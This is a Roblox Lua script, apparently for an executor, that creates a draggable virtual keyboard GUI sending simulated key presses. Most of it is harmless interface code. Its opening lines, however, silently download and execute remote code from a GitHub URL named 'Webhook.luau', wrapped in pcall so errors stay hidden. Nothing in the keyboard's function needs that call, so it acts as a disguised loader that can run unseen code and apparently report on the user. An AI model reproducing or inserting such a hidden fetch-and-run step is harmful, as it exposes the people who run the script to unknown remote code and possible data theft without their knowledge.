local Players = game:GetService("Players")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TweenService = game:GetService("TweenService")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/its-starflow/Scripts/main/Utility/Webhook.luau"))()
end)

local UI = {}

UI["ScreenGui"] = Instance.new("ScreenGui", playerGui)
UI["ScreenGui"]["Name"] = "KB_V1"
UI["ScreenGui"]["ResetOnSpawn"] = false
UI["ScreenGui"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling

UI["MainFrame"] = Instance.new("Frame", UI["ScreenGui"])
UI["MainFrame"]["Size"] = UDim2.new(0, 342, 0, 170)
UI["MainFrame"]["Position"] = UDim2.new(0, 16, 0, 0)
UI["MainFrame"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["MainFrame"]["BorderSizePixel"] = 0
UI["MainFrame"]["Name"] = "MainFrame"

UI["UICorner"] = Instance.new("UICorner", UI["MainFrame"])
UI["UICorner"]["CornerRadius"] = UDim.new(0, 4)

UI["UIStroke"] = Instance.new("UIStroke", UI["MainFrame"])
UI["UIStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["UIStroke"]["Color"] = Color3.fromRGB(171, 0, 255)
UI["UIStroke"]["Transparency"] = 1

UI["Title"] = Instance.new("TextLabel", UI["MainFrame"])
UI["Title"]["TextWrapped"] = true
UI["Title"]["BorderSizePixel"] = 0
UI["Title"]["TextSize"] = 24
UI["Title"]["TextXAlignment"] = Enum.TextXAlignment.Left
UI["Title"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32)
UI["Title"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["Title"]["TextColor3"] = Color3.fromRGB(171, 0, 255)
UI["Title"]["Size"] = UDim2.new(0, 341, 0, 30)
UI["Title"]["Text"] = "Kilobyte keyboard [V1]"
UI["Title"]["Name"] = "Title"
UI["Title"]["TextTransparency"] = 1

UI["TitleCorner"] = Instance.new("UICorner", UI["Title"])
UI["TitleCorner"]["CornerRadius"] = UDim.new(0, 4)

UI["Close"] = Instance.new("TextButton", UI["MainFrame"])
UI["Close"]["TextWrapped"] = true
UI["Close"]["BorderSizePixel"] = 0
UI["Close"]["TextScaled"] = true
UI["Close"]["TextColor3"] = Color3.fromRGB(255, 0, 0)
UI["Close"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43)
UI["Close"]["ZIndex"] = 5
UI["Close"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["Close"]["Size"] = UDim2.new(0, 26, 0, 26)
UI["Close"]["Text"] = "X"
UI["Close"]["Name"] = "Close"
UI["Close"]["Position"] = UDim2.new(0, 314, 0, 2)
UI["Close"]["TextTransparency"] = 1
UI["Close"]["BackgroundTransparency"] = 1

UI["CloseCorner"] = Instance.new("UICorner", UI["Close"])
UI["CloseCorner"]["CornerRadius"] = UDim.new(0, 4)

UI["UILine"] = Instance.new("Frame", UI["MainFrame"])
UI["UILine"]["ZIndex"] = 0
UI["UILine"]["BorderSizePixel"] = 0
UI["UILine"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32)
UI["UILine"]["Size"] = UDim2.new(0, 341, 0, 22)
UI["UILine"]["Position"] = UDim2.new(0, 0, 0, 8)
UI["UILine"]["Name"] = "UILine"

local keysLayout = {
    {"Q","E","R","T","Y"},
    {"U","P","L","K","J"},
    {"H","G","F","M","N"},
    {"B","V","C","X","Z"},
}

local keySize = 30
local spacing = 6
local startX = 36
local startY = 34
local keyButtons = {}

local keyMap = {
    Q = Enum.KeyCode.Q,
    E = Enum.KeyCode.E,
    R = Enum.KeyCode.R,
    T = Enum.KeyCode.T,
    Y = Enum.KeyCode.Y,
    U = Enum.KeyCode.U,
    P = Enum.KeyCode.P,
    L = Enum.KeyCode.L,
    K = Enum.KeyCode.K,
    J = Enum.KeyCode.J,
    H = Enum.KeyCode.H,
    G = Enum.KeyCode.G,
    F = Enum.KeyCode.F,
    M = Enum.KeyCode.M,
    N = Enum.KeyCode.N,
    B = Enum.KeyCode.B,
    V = Enum.KeyCode.V,
    C = Enum.KeyCode.C,
    X = Enum.KeyCode.X,
    Z = Enum.KeyCode.Z
}

for rowIndex, row in ipairs(keysLayout) do
    for colIndex, keyName in ipairs(row) do
        local posX = startX + (colIndex - 1) * (keySize + spacing)
        local posY = startY + (rowIndex - 1) * (keySize + spacing)
        
        UI[keyName] = Instance.new("TextButton", UI["MainFrame"])
        UI[keyName]["TextWrapped"] = true
        UI[keyName]["BorderSizePixel"] = 0
        UI[keyName]["TextScaled"] = true
        UI[keyName]["TextColor3"] = Color3.fromRGB(171, 0, 255)
        UI[keyName]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32)
        UI[keyName]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal)
        UI[keyName]["Size"] = UDim2.new(0, keySize, 0, keySize)
        UI[keyName]["Text"] = keyName
        UI[keyName]["Name"] = keyName
        UI[keyName]["Position"] = UDim2.new(0, posX, 0, posY)
        UI[keyName]["TextTransparency"] = 1
        UI[keyName]["BackgroundTransparency"] = 1
        
        UI[keyName.."Corner"] = Instance.new("UICorner", UI[keyName])
        UI[keyName.."Corner"]["CornerRadius"] = UDim.new(0, 4)
        
        UI[keyName.."Stroke"] = Instance.new("UIStroke", UI[keyName])
        UI[keyName.."Stroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
        UI[keyName.."Stroke"]["Color"] = Color3.fromRGB(171, 0, 255)
        UI[keyName.."Stroke"]["Transparency"] = 1
        
        table.insert(keyButtons, {button = UI[keyName], stroke = UI[keyName.."Stroke"]})
        
        TweenService:Create(UI[keyName], TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
        TweenService:Create(UI[keyName.."Stroke"], TweenInfo.new(0.5), {Transparency = 0}):Play()
        
        UI[keyName].MouseButton1Click:Connect(function()
            VirtualInputManager:SendKeyEvent(true, keyMap[keyName], false, nil)
            VirtualInputManager:SendKeyEvent(false, keyMap[keyName], false, nil)
            
            TweenService:Create(UI[keyName], TweenInfo.new(0.1), {
                BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            }):Play()
            
            task.wait(0.1)
            
            TweenService:Create(UI[keyName], TweenInfo.new(0.1), {
                BackgroundColor3 = Color3.fromRGB(32, 32, 32)
            }):Play()
        end)
    end
end

TweenService:Create(UI["UIStroke"], TweenInfo.new(0.5), {Transparency = 0}):Play()
TweenService:Create(UI["Title"], TweenInfo.new(0.5), {TextTransparency = 0}):Play()
TweenService:Create(UI["Close"], TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()

local function HoverAnim(button)
    local originalBg = button.BackgroundColor3
    local originalText = button.TextColor3
    
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(50, 50, 50),
            TextColor3 = Color3.fromRGB(200, 50, 255)
        }):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {
            BackgroundColor3 = originalBg,
            TextColor3 = originalText
        }):Play()
    end)
end

for keyName, keyCode in pairs(keyMap) do
    if UI[keyName] and UI[keyName]:IsA("TextButton") then
        HoverAnim(UI[keyName])
    end
end

HoverAnim(UI["Close"])

local function dragify(Frame)
    local UIS = game:GetService("UserInputService")
    local dragging = false
    local dragInput = nil
    local dragStart = nil
    local startPos = nil
    local dragSpeed = 0.25

    local function clampToScreenGui(gui, px, py)
        local ScreenGui = gui.AbsoluteSize
        local size = Frame.AbsoluteSize
        return math.clamp(px, 0, ScreenGui.X - size.X), math.clamp(py, 0, ScreenGui.Y - size.Y)
    end

    local function update(input)
        local gui = Frame:FindFirstAncestorOfClass("ScreenGui")
        if not gui then return end

        local delta = input.Position - dragStart
        local targetX = startPos.X + delta.X
        local targetY = startPos.Y + delta.Y
        targetX, targetY = clampToScreenGui(gui, targetX, targetY)

        if dragSpeed >= 1 then
            Frame.Position = UDim2.fromOffset(math.floor(targetX + 0.5), math.floor(targetY + 0.5))
            return
        end

        local cur = Frame.AbsolutePosition
        local interpX = cur.X + (targetX - cur.X) * math.clamp(dragSpeed, 0, 1)
        local interpY = cur.Y + (targetY - cur.Y) * math.clamp(dragSpeed, 0, 1)

        Frame.Position = UDim2.fromOffset(math.floor(interpX + 0.5), math.floor(interpY + 0.5))
    end

    Frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragInput = input
            dragStart = input.Position
            startPos = Frame.AbsolutePosition

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    dragInput = nil
                end
            end)
        end
    end)

    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            update(input)
        end
    end)
end

dragify(UI["MainFrame"])

UI["Close"].MouseButton1Click:Connect(function()
    for _, kb in ipairs(keyButtons) do
        TweenService:Create(kb.button, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        TweenService:Create(kb.stroke, TweenInfo.new(0.5), {Transparency = 1}):Play()
    end

    TweenService:Create(UI["UIStroke"], TweenInfo.new(0.5), {Transparency = 1}):Play()
    TweenService:Create(UI["Title"], TweenInfo.new(0.5), {TextTransparency = 1}):Play()
    TweenService:Create(UI["Close"], TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1}):Play()

    task.wait(0.5)
    UI["ScreenGui"]:Destroy()
end)

return UI["ScreenGui"]